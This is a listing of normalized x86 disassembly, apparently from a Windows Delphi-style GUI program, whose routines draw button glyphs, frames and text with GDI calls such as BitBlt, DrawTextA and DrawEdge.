mov eax [ r-xdata ]
call sub_437998
mov [ rw-data ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_429380
push eax
mov eax [ ebp - 0xc ]
call sub_429380
lea edx [ ebp - 0x28 ]
pop ecx
call sub_423f04
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x38 ] 0x1
jne r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov ecx 0x20000000
mov edx [ ebp - 0xc ]
call sub_43793c
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
call sub_43793c
xor edx edx
mov dl [ ebp - 0x5 ]
mov ecx [ ebp - 0x4 ]
mov [ ecx + edx * 4 + 0xc ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_438213
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_428db8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x1
jbe r-xdata
dec eax
sub al 0x2
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403254
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x14 ]
call sub_429380
mov eax [ eax + 0x14 ]
xor edx edx
call sub_423c94
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebp - 0x14 ]
call sub_42943c
test al al
je r-xdata
mov eax [ ebp - 0xc ]
call sub_429380
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429380
mov ecx eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_423f04
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42a150
mov edx edi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx esi
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x10 ]
call sub_429380
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_423c94
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429380
push eax
mov eax [ ebp - 0x14 ]
call sub_429380
lea edx [ ebp - 0x28 ]
pop ecx
call sub_423f04
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000014
call sub_423c94
mov eax [ ebp - 0x18 ]
call sub_424598
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_429380
call sub_424598
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x10 ]
call sub_429380
mov eax [ eax + 0x14 ]
mov edx 0x808080
call sub_423c94
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429380
push eax
mov eax [ ebp - 0x14 ]
call sub_429380
lea edx [ ebp - 0x28 ]
pop ecx
call sub_423f04
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff000010
call sub_423c94
mov eax [ ebp - 0x18 ]
call sub_424598
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_429380
call sub_424598
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_422fe8
push eax
mov eax [ ebp - 0x10 ]
call sub_429380
mov eax [ eax + 0x14 ]
pop edx
call sub_423c94
lea eax [ ebp - 0x38 ]
push eax
mov eax [ ebp - 0x10 ]
call sub_429380
push eax
mov eax [ ebp - 0x14 ]
call sub_429380
lea edx [ ebp - 0x28 ]
pop ecx
call sub_423f04
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_423c94
mov eax [ ebp - 0x18 ]
call sub_424598
mov ebx eax
push 0x0
push ebx
call SetTextColor
push 0xffffff
push ebx
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_429380
call sub_424598
push eax
push esi
push edi
push 0x0
push 0x0
push ebx
call BitBlt
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x14 ]
call sub_42a150
mov eax [ ebp - 0xc ]
call sub_429380
mov ebx eax
mov eax [ ebx + 0x14 ]
mov edx 0xff00000f
call sub_423c94
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_4240b4
mov eax [ ebx + 0x14 ]
mov edx 0xff000014
call sub_423c94
push 0x0
mov eax ebx
call sub_424598
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_424598
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_429380
call sub_424598
push eax
push esi
push edi
push 0x1
push 0x1
mov eax ebx
call sub_424598
push eax
call BitBlt
mov eax [ ebx + 0x14 ]
mov edx 0xff000010
call sub_423c94
push 0x0
mov eax ebx
call sub_424598
push eax
call SetTextColor
push 0xffffff
mov eax ebx
call sub_424598
push eax
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_429380
call sub_424598
push eax
push esi
push edi
push 0x0
push 0x0
mov eax ebx
call sub_424598
push eax
call BitBlt
mov eax [ ebp - 0x14 ]
call sub_429380
mov eax [ eax + 0xc ]
mov edx 0xffffff
call sub_4234a8
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_42a150
mov eax [ ebp - 0x14 ]
call sub_429380
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_423c94
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_403254
mov eax [ ebp - 0x14 ]
call sub_403254
retn
sub_438278
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ebx [ ebp + 0xc ]
cmp [ edi + 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
je r-xdata
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
test eax eax
je r-xdata
mov edx ebx
mov eax edi
call sub_437ca0
mov esi eax
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
mov [ ebp - 0x24 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
xor edx edx
mov dl [ edi + 0x20 ]
mov ecx edx
cdq
idiv ecx
add eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
dec bl
je r-xdata
push 0x1
push 0x1fffffff
push 0x1fffffff
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424598
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_4573e0
push eax
call ImageList_DrawEx
jmp r-xdata
cmp bl 0x3
jne r-xdata
mov bl 0x5
jmp r-xdata
dec ebx
sub bl 0x2
jb r-xdata
push 0x0
push 0x1fffffff
mov eax 0xff00000f
call sub_422fe8
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424598
push eax
push esi
mov eax [ edi + 0x8 ]
call sub_4573e0
push eax
call ImageList_DrawEx
call sub_43a9dc
lea ecx [ ebp - 0x14 ]
mov edx ebx
call sub_43ad20
lea eax [ ebp - 0x24 ]
push eax
mov eax [ edi + 0x8 ]
call sub_4573e0
push eax
push esi
mov eax [ ebp - 0x4 ]
call sub_424598
push eax
call sub_43a9dc
lea ecx [ ebp - 0x14 ]
pop edx
call sub_43ac0c
jmp r-xdata
mov bl 0x4
jmp r-xdata
jmp r-xdata
mov bl 0x2
sub_4383dc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_423db0
cmp [ ebp + 0xc ] 0x1
jne r-xdata
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404264
push eax
mov eax esi
call sub_404464
push eax
mov eax ebx
call sub_424598
push eax
call DrawTextA
push 0x1
push 0x1
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000014
mov eax [ ebx + 0xc ]
call sub_4234a8
mov eax edi
or eax 0x5
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404264
push eax
mov eax esi
call sub_404464
push eax
mov eax ebx
call sub_424598
push eax
call DrawTextA
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call OffsetRect
mov edx 0xff000010
mov eax [ ebx + 0xc ]
call sub_4234a8
or edi 0x5
push edi
lea eax [ ebp - 0x10 ]
push eax
mov eax esi
call sub_404264
push eax
mov eax esi
call sub_404464
push eax
mov eax ebx
call sub_424598
push eax
call DrawTextA
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4384bc
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
and eax 0x2
cmp eax 0x2
jne r-xdata
mov edx [ ebx + 0xc ]
sub edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
sub eax [ ebx ]
lea ecx [ ebp - 0x18 ]
call sub_419174
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_419174
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x20 ]
mov ecx edx
cdq
idiv ecx
lea ecx [ ebp - 0x20 ]
pop edx
call sub_419174
jmp r-xdata
cmp [ ebp + 0x1c ] 0x1
jne r-xdata
mov [ ebp + 0x1c ] 0x1
jmp r-xdata
push 0x0
lea eax [ ebp - 0x40 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_41919c
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea ecx [ ebp - 0x28 ]
xor edx edx
xor eax eax
call sub_419174
push 0x0
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebx + 0x8 ]
sub ecx [ ebx ]
xor edx edx
xor eax eax
call sub_41919c
push esi
push edi
lea esi [ ebp - 0x40 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov eax [ ebp + 0x8 ]
or eax 0x400
push eax
push edi
mov eax [ ebp + 0x20 ]
call sub_404264
push eax
mov eax [ ebp + 0x20 ]
call sub_404464
push eax
mov eax [ ebp - 0x8 ]
call sub_424598
push eax
call DrawTextA
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
mov eax [ edi + 0x8 ]
sub eax [ edi ]
lea ecx [ ebp - 0x28 ]
call sub_419174
jmp r-xdata
mov eax [ ebp + 0x20 ]
call sub_404264
test eax eax
jle r-xdata
mov [ ebp + 0x1c ] 0x0
mov eax [ ebp - 0x18 ]
mov edx eax
sub edx [ ebp - 0x20 ]
inc edx
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
mov edx eax
sub edx [ ebp - 0x1c ]
inc edx
sar edx 0x1
jns r-xdata
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov [ esi ] edx
sub eax [ ebp - 0x28 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ esi + 0x4 ] edx
sub eax [ ebp - 0x24 ]
inc eax
sar eax 0x1
jns r-xdata
adc edx 0x0
mov [ ebp - 0x10 ] eax
adc eax 0x0
mov [ ebp - 0xc ] eax
jmp r-xdata
adc eax 0x0
xor eax eax
mov [ ebp + 0x14 ] eax
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
cmp [ ebp - 0x28 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
cmp [ ebp + 0x18 ] 0xffffffff
jne r-xdata
mov al [ ebp + 0x1c ]
sub al 0x1
jb r-xdata
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x18 ]
add eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
pop ecx
sub eax ecx
lea ecx [ ebp - 0x30 ]
call sub_419174
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp + 0x14 ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
add eax [ ebp - 0x28 ]
call sub_419174
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
add edx [ ebp - 0x24 ]
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
call sub_419174
mov al [ ebp + 0x1c ]
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi ] eax
add eax [ ebp - 0x20 ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ ebp - 0x24 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x30 ]
sub eax [ ebp - 0x28 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
inc eax
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x2c ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x30 ]
mov ecx 0x3
cdq
idiv ecx
mov [ ebp + 0x18 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
add [ esi ] eax
mov eax [ ebx + 0x4 ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
add [ esi + 0x4 ] eax
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ esi ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
dec al
je r-xdata
mov [ ebp + 0x14 ] eax
adc eax 0x0
mov [ ebp + 0x14 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov [ ebp + 0x18 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x18 ]
mov [ ebp + 0x14 ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
mov edx [ ebp + 0x24 ]
add eax [ edx + 0x4 ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
mov edx [ ebp + 0x24 ]
add eax [ edx ]
push eax
push edi
call OffsetRect
mov eax [ ebx + 0x4 ]
add eax [ ebp - 0xc ]
push eax
mov eax [ ebx ]
add eax [ ebp - 0x10 ]
push eax
push edi
call OffsetRect
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov [ esi + 0x4 ] eax
add eax [ ebp - 0x1c ]
add eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x20
mov eax [ ebp - 0x14 ]
sub eax [ ebp + 0x18 ]
sub eax [ ebp - 0x1c ]
mov [ esi + 0x4 ] eax
sub eax [ ebp + 0x14 ]
sub eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_4387e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x24 ]
mov eax [ ebp + 0x28 ]
push eax
push edi
mov al [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x18 ]
push eax
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4384bc
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax ebx
call sub_438278
mov eax [ ebp + 0x8 ]
push eax
mov al [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4383dc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_438858
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_448cfc
mov eax esi
mov edx [ r-xdata ]
call sub_403404
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_43887c
push ebx
mov ebx eax
mov eax ebx
call sub_456604
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x168 ] 0x0
je r-xdata
mov eax [ ebx + 0x20 ]
cmp [ eax + 0x172 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov al [ eax + 0x69 ]
mov edx [ ebx + 0x20 ]
cmp al [ edx + 0x170 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4388c8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x20 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403404
mov eax [ eax + 0x6c ]
cmp eax [ esi + 0x168 ]
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_4388f8
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x20 ]
call sub_4391a8
sub_438918
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x2c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x20 ]
call sub_439234
sub_438938
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_437a9c
mov [ ebx + 0x16c ] eax
mov eax [ ebx + 0x16c ]
mov [ eax + 0x2c ] ebx
mov [ eax + 0x28 ] sub_439168
mov ecx esi
xor edx edx
mov eax ebx
call sub_451a20
push 0x17
push 0x16
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax ebx
call sub_44a0e4
mov edx 0xff00000f
mov eax ebx
call sub_44a158
mov [ ebx + 0x174 ] 0x4
mov [ ebx + 0x17c ] 0xffffffff
mov [ ebx + 0x173 ] 0x0
mov [ ebx + 0x178 ] 0x1
inc [ rw-data ]
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403578
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d0
pop [ fs : 0x0 ]
add esp 0xc
sub_4389f8
push ebx
push esi
call sub_4035e0
mov ebx edx
mov esi eax
dec [ rw-data ]
mov edx ebx
and dl 0xfc
mov eax esi
call sub_451a7c
mov eax [ esi + 0x16c ]
call sub_403254
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035c8
sub_438a30
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x3c ] edx
mov esi eax
xor eax eax
push ebp
push sub_438e5a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov [ esi + 0x182 ] 0x1
mov [ esi + 0x171 ] 0x0
jmp r-xdata
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x160 ]
call sub_424494
call sub_43a9dc
call sub_43aabc
test al al
je r-xdata
cmp [ esi + 0x170 ] 0x0
je r-xdata
mov eax [ esi + 0x4c ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov ecx [ esi + 0x48 ]
xor edx edx
xor eax eax
call sub_41919c
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_424598
mov edx eax
mov eax esi
call sub_44710c
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov [ esi + 0x182 ] 0x0
cmp [ esi + 0x168 ] 0x0
je r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jb r-xdata
mov ebx 0x2010
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x5
jmp r-xdata
mov [ esi + 0x182 ] 0x3
jmp r-xdata
xor eax eax
mov al [ esi + 0x178 ]
mov eax [ eax * 4 + rw-data ]
or eax 0xf
push eax
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
setb al
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
push eax
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_424598
push eax
call DrawEdge
jmp r-xdata
cmp [ esi + 0x181 ] 0x0
je r-xdata
push ebx
push 0x4
lea eax [ ebp - 0x19 ]
push eax
mov eax [ esi + 0x160 ]
call sub_424598
push eax
call DrawFrameControl
jmp r-xdata
or ebx 0x200
cmp [ esi + 0x181 ] 0x0
je r-xdata
mov [ ebp - 0x9 ] 0x4
jmp r-xdata
xor ebx ebx
cmp [ esi + 0x180 ] 0x0
je r-xdata
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x19 ]
push eax
call InflateRect
test [ esi + 0x1c ] 0x10
je r-xdata
cmp [ esi + 0x182 ] 0x1
jne r-xdata
mov al [ esi + 0x182 ]
add al 0xfe
sub al 0x2
jae r-xdata
mov [ ebp - 0x9 ] 0x2
mov [ ebp - 0x9 ] 0x3
jmp r-xdata
lea edx [ ebp - 0x19 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
test bl bl
jne r-xdata
mov al [ ebp - 0x9 ]
sub al 0x2
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ esi + 0x182 ] 0x3
jne r-xdata
cmp [ esi + 0x178 ] 0x0
jne r-xdata
call sub_43a9dc
lea ecx [ ebp - 0x28 ]
mov edx ebx
call sub_43ade0
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_424598
push eax
call sub_43a9dc
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43abc8
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_424598
push eax
call sub_43a9dc
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43ab2c
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
call sub_43a9dc
lea ecx [ ebp - 0x28 ]
mov dl [ ebp - 0x9 ]
call sub_43ad20
lea eax [ ebp - 0x19 ]
push eax
push 0x0
mov eax [ esi + 0x160 ]
call sub_424598
push eax
call sub_43a9dc
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43abc8
lea eax [ ebp - 0x19 ]
push eax
lea eax [ ebp - 0x38 ]
push eax
mov eax [ esi + 0x160 ]
call sub_424598
push eax
call sub_43a9dc
lea ecx [ ebp - 0x28 ]
pop edx
call sub_43ab2c
push esi
lea esi [ ebp - 0x38 ]
lea edi [ ebp - 0x19 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
mov bl 0x2
dec al
je r-xdata
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ esi + 0x70 ]
call sub_423c94
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_4240b4
lea ecx [ ebp - 0x8 ]
xor edx edx
xor eax eax
call sub_419174
test bl bl
je r-xdata
cmp [ ebp - 0x9 ] 0x4
jne r-xdata
mov bl 0x3
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x40 ]
mov eax esi
call sub_449fb8
mov eax [ ebp - 0x40 ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
mov al [ esi + 0x182 ]
push eax
mov al [ esi + 0x178 ]
push eax
xor edx edx
mov eax esi
call sub_44c298
push eax
lea eax [ ebp - 0x38 ]
push eax
lea ecx [ ebp - 0x19 ]
mov edx [ esi + 0x160 ]
mov eax [ esi + 0x16c ]
call sub_4387e8
mov edx 0xff000014
mov eax 0xff00000f
call sub_42affc
mov edx eax
mov eax [ esi + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_423c68
lea edx [ ebp - 0x19 ]
mov eax [ esi + 0x160 ]
call sub_4240b4
cmp [ esi + 0x181 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438e61
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403fc8
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax 0x1
call sub_419174
jmp r-xdata
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_4234a8
mov bl 0x4
jmp r-xdata
dec al
jne r-xdata
lea eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0x3c ]
mov eax esi
call sub_449fb8
mov eax [ ebp - 0x3c ]
push eax
mov al [ esi + 0x173 ]
push eax
mov eax [ esi + 0x17c ]
push eax
mov eax [ esi + 0x174 ]
push eax
